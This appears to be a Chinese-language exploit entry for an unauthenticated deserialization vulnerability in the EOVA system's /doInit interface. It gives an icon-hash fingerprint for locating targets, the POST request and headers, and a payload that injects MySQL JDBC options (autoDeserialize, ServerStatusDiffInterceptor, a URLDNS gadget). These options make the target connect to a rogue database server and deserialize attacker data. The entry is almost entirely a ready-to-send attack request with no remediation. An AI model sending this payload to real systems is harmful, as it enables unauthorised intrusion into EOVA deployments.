# EOVA未授权doInit接口存在反序列化漏洞

- **系统**：EOVA　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`icon_hash="-1699356011"`
- **请求**：`POST /doInit HTTP/1.1`
- **关键头**：`Sec-Fetch-User: ?1`　`Cookie: JSESSIONID=1diwaoe2lud2k1w5bzj9gy0r9v; _jfinal_captcha=ec1807bb391d443f9730b7b18…`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
ip=127.0.0.1:3333%2Ftest%3FautoDeserialize=true%26statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%26user=URLDNS%26Yu9=Yu9%23&port=&username=root&password=123456
```
- **预期**：200　|　—